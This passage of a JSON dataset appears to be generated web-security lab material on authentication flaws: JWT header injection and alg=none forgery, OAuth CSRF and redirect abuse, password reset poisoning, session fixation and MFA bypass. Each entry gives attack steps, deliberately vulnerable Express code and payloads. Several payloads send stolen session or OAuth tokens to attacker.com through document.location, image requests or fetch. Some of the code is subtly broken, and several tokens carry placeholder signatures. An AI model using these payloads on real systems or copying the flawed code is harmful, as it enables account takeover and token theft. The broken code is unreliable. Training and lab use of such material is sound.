      "Capture login mutation with Postman to analyze GraphQL schema",
      "Create a batch request with 1000 login attempts using common passwords",
      "Use Burp Intruder to automate the attack with different username/password combinations",
      "Identify successful login by searching for 200 OK responses with valid session cookies",
      "Extract session cookie and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');const typeDefs = gql`type Mutation {login(username: String!, password: String!): AuthPayload}`;const resolvers = {Mutation: {login: (_, args) => {if(args.password === 'correct') return {token: 'valid'};throw new Error('Invalid');}}};const server = new ApolloServer({ typeDefs, resolvers });server.applyMiddleware({ app });app.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"password1\"}}}]",
      "{\"query\":\"mutation{login1:login(username:\\\"admin\\\",password:\\\"123456\\\"){token} login2:login(username:\\\"admin\\\",password:\\\"qwerty\\\"){token}}\"}",
      "{\"query\":\"mutation($pass:String!){login(username:\\\"admin\\\",password:$pass){token}}\",\"variables\":{\"pass\":\"admin123\"}}"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-authenticated JWT in SOAP API",
    "Lab Description": "The SOAP-based authentication service issues JWTs before email verification is complete. The application doesn't invalidate pre-verification tokens after verification. To solve: fixate a session by obtaining a pre-verification token, completing verification, then using the original token to access the account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept account registration request with Burp Suite",
      "Extract the JWT from the response before email verification",
      "Complete the email verification process in a separate session",
      "Reuse the original JWT to bypass authentication checks",
      "Access privileged endpoints with the pre-verification token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/register', (req, res) => {const token = jwt.sign({email: req.body.email, verified: false}, 'secret', {expiresIn: '1h'});res.send(token);});app.post('/verify-email', (req, res) => {const token = req.body.token;jwt.verify(token, 'secret', (err, decoded) => {if(err) return res.status(400).send('Invalid');decoded.verified = true;res.send(jwt.sign(decoded, 'secret'));});});app.get('/account', (req, res) => {const token = req.headers.authorization;jwt.verify(token, 'secret', (err, decoded) => {if(!err && decoded.email) return res.send('Account data');res.status(401).send('Unauthorized');});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NTQyMzQ1NjB9.9QJhZvLqzVj5v5X5d5X5d5X5d5X5d5X5d5X5d5X5d5X",
      "<soap:Envelope><soap:Header><wsse:Security><wsse:UsernameToken><wsse:Username>admin</wsse:Username><wsse:Password>pre-verified-token</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header></soap:Envelope>",
      "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NTQyMzQ1NjB9.9QJhZvLqzVj5v5X5d5X5d5X5d5X5d5X5d5X5d5X5d5X\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow can be bypassed by manipulating the status parameter in the verification request. The application fails to validate the MFA completion state server-side. To solve: intercept the MFA verification process and modify the status parameter to 'verified' before the code is validated.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Log in with valid credentials using Burp Suite",
      "Intercept the MFA initiation request and note the session token",
      "Forward the request but don't submit the verification code",
      "Manually craft a request to /verify-mfa with status=verified",
      "Access protected resources with the bypassed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());let sessions = {};app.post('/verify-mfa', (req, res) => {const { sessionId, code, status } = req.body;if(status === 'verified' || (sessions[sessionId] && sessions[sessionId] === code)) {return res.send({ token: 'valid-token' });}res.status(403).send('Invalid MFA');});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"123\",\"status\":\"verified\"}",
      "sessionId=123&status=verified",
      "<request><sessionId>123</sessionId><status>verified</status></request>"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The JWT validation service vulnerable to key path traversal via kid header. The application loads verification keys from filesystem without sanitization. To solve: forge admin token by forcing system to use public key from predictable location.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze kid header",
      "Modify kid to point to /etc/passwd and observe error leakage",
      "Craft kid header targeting /dev/null to trigger key load failure",
      "Switch to known public key location like /var/www/public.key",
      "Sign modified token with attacker-generated key matching public key"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, (header, callback) => {fs.readFile('/keys/'+header.kid, (err, key) => {callback(null, key);});});if(decoded.role === 'admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii92YXIvd3d3L3B1YmxpYy5rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.real-signature",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF in social login flow",
    "Lab Description": "The OAuth implementation fails to validate state parameter in callback handler. The application accepts any state value after initial redirect. To solve: craft malicious link that authenticates victim to attacker's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify state parameter",
      "Capture valid authentication request and remove state parameter",
      "Observe system still completes authentication without state",
      "Construct phishing URL with attacker-controlled state value",
      "Lure victim to click link while attacker maintains session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;const state = req.query.state || 'default';req.session.state = state;res.redirect('/profile?state='+state);});app.get('/profile', (req, res) => {if(req.query.state === req.session.state) res.send('Profile data');else res.send('Invalid state');});app.listen(3000);",
    "payloads": [
      "https://victim.com/oauth/callback?code=123&state=attacker_value",
      "<iframe src=\"https://victim.com/oauth/authorize?response_type=code&client_id=client&state=attacker_value\">",
      "javascript:fetch('https://victim.com/oauth/callback?code=stolen&state=attacker_value')"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSONP callback parameter",
    "Lab Description": "The JSONP endpoint leaks session tokens through callback parameter reflection. The application embeds sensitive data in JavaScript responses. To solve: fixate victim's session by crafting malicious JSONP request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover JSONP endpoint using Burp Suite scanner",
      "Analyze response containing session token in callback",
      "Craft HTML page with malicious callback function",
      "Induce victim to visit page which steals their session",
      "Use captured token to impersonate victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/userinfo', (req, res) => {const callback = req.query.callback || 'callback';res.set('Content-Type', 'application/javascript');res.send(callback+'({token: \"'+req.session.token+'\"});');});app.listen(3000);",
    "payloads": [
      "<script src=\"https://victim.com/userinfo?callback=stealToken\"></script>",
      "function stealToken(data){document.location='https://attacker.com/?token='+data.token;}",
      "<script>function exfil(data){new Image().src='http://attacker.com/'+data.token;}</script><script src='https://victim.com/userinfo?callback=exfil'></script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Host",
    "Lab Description": "The password reset functionality trusts X-Forwarded-Host header for link generation. The application doesn't validate host headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Forwarded-Host: attacker.com header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const host = req.headers['x-forwarded-host'] || req.headers.host;const token = generateToken();res.send('Reset link: https://'+host+'/reset?token='+token);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1",
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Scenario": "The JWT validation accepts arbitrary jku headers pointing to external keys. The application doesn't restrict key server locations. To solve: host malicious public key and forge valid token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note jku header support",
      "Generate RSA key pair using OpenSSL",
      "Host public key on attacker-controlled server",
      "Craft token with jku pointing to malicious key",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;const decoded = jwt.verify(token, {complete: true}, {algorithms: ['RS256']});fetch(decoded.header.jku).then(key => {jwt.verify(token, key);});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2tleS5qc29uIn0.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMua2V5In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImpydSI6Imh0dHBzOi8vZXZpbC5jb20va2V5In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT x5u header SSRF in banking API",
    "Lab Description": "The JWT validation vulnerable to SSRF via x5u header fetching external certificates. The application processes x5u URLs without proper validation. To solve: forge admin token by forcing server to fetch verification certificate from attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze x5u header support",
      "Set up malicious HTTPS server with self-signed certificate",
      "Craft JWT with x5u pointing to attacker server",
      "Capture outgoing request from validation server",
      "Sign token with matching private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const https = require('https');const app = express();app.get('/transfer', (req, res) => {const token = req.headers.authorization;jwt.verify(token, {complete:true}, (err, decoded) => {if(err) return res.status(403).send('Invalid token');if(decoded.header.x5u) {https.get(decoded.header.x5u, cert => {jwt.verify(token, cert, {algorithms:['RS256']});});}if(decoded.payload.role==='admin') res.send('Transfer approved');});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMucGVtIn0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5jb20vY2VydCJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via parameter pollution",
    "Lab Description": "The OAuth token endpoint vulnerable to parameter pollution in redirect_uri. The application processes multiple redirect_uri parameters inconsistently. To solve: steal authorization code by injecting secondary redirect_uri pointing to attacker server.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify redirect_uri usage",
      "Intercept authorization request and duplicate redirect_uri parameter",
      "Set first redirect_uri to legitimate value and second to attacker domain",
      "Capture authorization code sent to malicious endpoint",
      "Exchange code for access token at legitimate token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/authorize', (req, res) => {const uris = Array.isArray(req.query.redirect_uri) ? req.query.redirect_uri : [req.query.redirect_uri];res.redirect(uris[0]+'?code=123');});app.listen(3000);",
    "payloads": [
      "/oauth/authorize?client_id=legit&redirect_uri=https://client.com&redirect_uri=https://attacker.com",
      "/oauth/authorize?client_id=legit&redirect_uri[]=https://client.com&redirect_uri[]=https://attacker.com",
      "/oauth/authorize?client_id=legit&redirect_uri=https%3A%2F%2Fclient.com&redirect_uri=https%3A%2F%2Fattacker.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The WebSocket connection assigns sessions based on handshake headers. The application reuses existing session cookies without regeneration. To solve: fixate victim's session by forcing WebSocket connection with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake request with Burp Suite",
      "Note session cookie assignment during upgrade",
      "Craft malicious page initiating WebSocket with fixed session",
      "Induce victim to visit page while maintaining connection",
      "Hijack authenticated session through WebSocket channel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.get('/chat', (req, res) => {res.cookie('session', req.query.sid||generateId());res.sendFile('chat.html');});wss.on('connection', ws => {ws.send('Connected as '+ws.upgradeReq.headers.cookie);});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/chat','session=attacker_sid')",
      "<script>const ws = new WebSocket('ws://victim.com/chat');ws.onopen=()=>{document.cookie='session=attacker_sid'}</script>",
      "fetch('http://victim.com/chat?sid=attacker_sid')"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via Host header",
    "Lab Description": "The password reset functionality trusts dynamic Host header for link generation. The application doesn't validate host against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Modify Host header to attacker.com",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const token = generateToken();res.send(`Reset link: https://${req.headers.host}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5c header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5c headers containing embedded certificates. The application doesn't verify certificate chain. To solve: forge admin token by embedding attacker-generated certificate in x5c header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5c header support",
      "Generate self-signed certificate using OpenSSL",
      "Extract public key and create matching JWT",
      "Embed certificate chain in x5c header",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.x5c) {const cert = decoded.header.x5c[0];jwt.verify(token, cert);}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJhdHRhY2tlci1jZXJ0Il19.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJmYWtlLWNlcnQtaGVyZSJdfQ.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1YyI6WyJtYWxpY2lvdXMtY2VydGlmaWNhdGUiXX0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT typ header injection in healthcare API",
    "Lab Description": "The JWT validation vulnerable to algorithm confusion via typ header manipulation. The application processes tokens with typ=None without proper verification. To solve: forge admin token by switching algorithm to none and removing signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze typ header",
      "Modify typ header to 'None' and remove signature",
      "Change payload to include admin privileges",
      "Submit token in Authorization header",
      "Access patient records to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, null, {algorithms: ['HS256','none']});if(decoded.typ === 'None') decoded = jwt.decode(token);if(decoded.role === 'admin') res.send('Patient records');} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiTm9uZSJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJOb25lIiwiYWxnIjoibm9uZSJ9.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiTk9ORSJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through postMessage in embedded iframes. The application doesn't validate message origins in token callbacks. To solve: steal OAuth token by crafting malicious page that intercepts postMessage communications.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify iframe usage",
      "Create malicious HTML page with postMessage listener",
      "Lure victim to visit page containing legitimate OAuth iframe",
      "Capture access token sent via postMessage",
      "Use token to query protected API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = generateToken();res.send(`<script>window.opener.postMessage('${token}','*')</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/callback\"></iframe><script>window.addEventListener('message',e=>{document.location='https://attacker.com/?token='+e.data});</script>",
      "window.open('https://victim.com/oauth','_blank').onmessage=e=>fetch('https://attacker.com/?token='+e.data)",
      "<div id=\"steal\"></div><script>window.onmessage=e=>document.getElementById('steal').innerHTML=e.data;</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket initialization",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions during websocket connection. The application reuses session cookies from HTTP requests without regeneration. To solve: fixate victim's session by forcing websocket connection with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL websocket handshake with Burp Suite",
      "Note session cookie assignment during connection",
      "Craft malicious page initiating subscription with fixed session",
      "Induce victim to visit page while maintaining connection",
      "Execute privileged GraphQL operations through websocket"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { createServer } = require('http');const { SubscriptionServer } = require('subscriptions-transport-ws');const app = express();const server = createServer(app);SubscriptionServer.create({onConnect: (params, socket) => {socket.session = socket.upgradeReq.headers.cookie;}}, {server, path: '/graphql'});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/graphql','session=attacker_sid')",
      "const ws = new WebSocket('ws://victim.com/graphql');ws.onopen=()=>{ws.send(JSON.stringify({query:'subscription{data}'}))}",
      "<script>const client = new SubscriptionClient('ws://victim.com/graphql',{connectionParams:{session:'attacker_sid'}})</script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Original-Host header",
    "Lab Description": "The password reset functionality trusts X-Original-Host header for link generation. The application doesn't validate host headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Original-Host: attacker.com header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const host = req.headers['x-original-host'] || req.headers.host;const token = generateToken();res.send(`Reset link: https://${host}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Original-Host: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Original-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jwk header injection",
    "Lab Description": "The JWT validation accepts arbitrary jwk headers containing embedded keys. The application doesn't verify key provenance. To solve: forge admin token by embedding attacker-generated public key in jwk header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note jwk header support",
      "Generate RSA key pair using OpenSSL",
      "Create JWT with jwk header containing public key",
      "Sign token with matching private key",
      "Submit to privileged endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.jwk) {jwt.verify(token, decoded.header.jwk);}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiYXR0YWNrZXIta2V5In19.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoibWFsbGljaW91cy1rZXkifX0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiZXZpbC1wdWJsaWMta2V5In19.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT cty header injection in banking API",
    "Lab Description": "The JWT validation vulnerable to content type confusion via cty header manipulation. The application processes tokens with cty=text/plain without signature verification. To solve: forge admin token by switching content type and removing signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze cty header",
      "Modify cty header to 'text/plain' and remove signature",
      "Change payload to include admin privileges",
      "Submit token in Authorization header",
      "Access transaction history to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/transactions', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, null, {algorithms: ['HS256']});if(decoded.header.cty === 'text/plain') decoded = jwt.decode(token);if(decoded.role === 'admin') res.send('Transaction records');} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsImN0eSI6InRleHQvcGxhaW4ifQ.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJjdHkiOiJ0ZXh0L3BsYWluIiwiYWxnIjoiSFMyNTYifQ.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJIUzI1NiIsImN0eSI6InRleHQvcGxhaW4ifQ.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through WebSocket connection parameters. The application embeds tokens in WebSocket URLs without validation. To solve: steal OAuth token by intercepting WebSocket initialization requests.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify WebSocket usage",
      "Intercept WebSocket connection request containing token",
      "Capture access token from WebSocket URL parameters",
      "Use token to query protected API endpoints",
      "Access user profile data to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.get('/chat', (req, res) => {const token = req.query.token;res.send(`<script>new WebSocket('ws://victim.com/ws?token=${token}')</script>`);});wss.on('connection', ws => {ws.send('Connected');});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/ws?token=stolen-token')",
      "const ws = new WebSocket(`ws://victim.com/ws?token=${document.cookie.match(/token=([^;]+)/)[1]}`)",
      "<iframe src=\"javascript:new WebSocket('ws://victim.com/ws?token='+localStorage.getItem('token'))\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 push promise",
    "Lab Description": "The HTTP/2 server pushes session cookies via push promises without proper validation. The application accepts pushed cookies from unauthorized sources. To solve: fixate victim's session by injecting malicious push promises containing predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/2 traffic with Burp Suite to analyze push promises",
      "Craft malicious push promise containing session cookie",
      "Intercept victim's connection and inject push promise",
      "Hijack authenticated session using fixated cookie",
      "Access privileged resources to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const spdy = require('spdy');const app = express();app.get('/', (req, res) => {res.push('/cookie', {'set-cookie':'session=attacker_sid'}, (err, stream) => {stream.end();});res.send('Home page');});spdy.createServer(options, app).listen(3000);",
    "payloads": [
      "GET / HTTP/2\nHost: victim.com\nAccept: */*",
      "PUSH_PROMISE /cookie\nHost: victim.com\nset-cookie: session=attacker_sid",
      "GET /account HTTP/2\nHost: victim.com\nCookie: session=attacker_sid"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Rewrite-URL header",
    "Lab Description": "The password reset functionality trusts X-Rewrite-URL header for link generation. The application doesn't validate rewrite headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Rewrite-URL: https://attacker.com/reset header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const url = req.headers['x-rewrite-url'] || 'https://victim.com/reset';const token = generateToken();res.send(`Reset link: ${url}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Rewrite-URL: https://attacker.com/reset",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Original-URL: /reset\nX-Rewrite-URL: https://attacker.com/reset"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5t header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5t headers containing certificate thumbprints. The application doesn't verify certificate chain integrity. To solve: forge admin token by spoofing certificate thumbprint in x5t header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5t header support",
      "Generate self-signed certificate using OpenSSL",
      "Calculate SHA-1 thumbprint of certificate",
      "Create JWT with x5t header matching thumbprint",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.x5t) {jwt.verify(token, {thumbprint:decoded.header.x5t});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dCI6ImF0dGFja2VyLXRodW1icHJpbnQifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCI6Im1hbGxpY2lvdXMtdGh1bWJwcmludCJ9.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCI6ImV2aWwtdGh1bWJwcmludCJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT alg=none bypass in healthcare API",
    "Lab Description": "The JWT validation accepts unsigned tokens when alg=none is specified in the header. The application fails to properly validate token signatures. To solve: forge an admin token by setting algorithm to none and removing the signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite",
      "Modify header to set alg=none",
      "Remove signature section entirely",
      "Change payload to include admin role",
      "Submit modified token to access patient records"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/patient-records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, 'secret', {algorithms: ['HS256','none']});if(decoded.role === 'admin') res.json({records: 'sensitive data'});} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhY2Nlc3MiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via Referer header",
    "Lab Description": "The OAuth implementation leaks authorization codes through Referer headers when loading external resources. The application fails to strip sensitive tokens from Referer headers. To solve: steal an OAuth token by forcing a request to an attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept OAuth flow with Burp Suite",
      "Inject malicious iframe pointing to attacker domain",
      "Capture authorization code in server logs",
      "Exchange code for access token",
      "Query userinfo endpoint with stolen token"
    ],
    "Vulnerability name": "Authentication",
